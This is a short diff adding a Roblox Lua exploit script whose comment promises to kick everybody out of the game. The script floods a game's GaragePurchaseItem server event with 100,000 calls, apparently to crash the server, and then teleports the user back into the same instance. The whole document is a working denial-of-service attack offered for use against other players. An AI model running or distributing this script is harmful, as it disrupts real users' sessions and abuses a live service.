@@ -1,0 +1,9 @@
+-- made by bread incorporated
+-- get in a car, execute and watch everybody get kicked out of the game
+task.delay(5, function()
+     game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId)
+end)
+
+for i = 1, 100000 do
+      game:GetService("ReplicatedStorage").GaragePurchaseItem:FireServer("LicensePlate", string.rep(i, 5))
+end
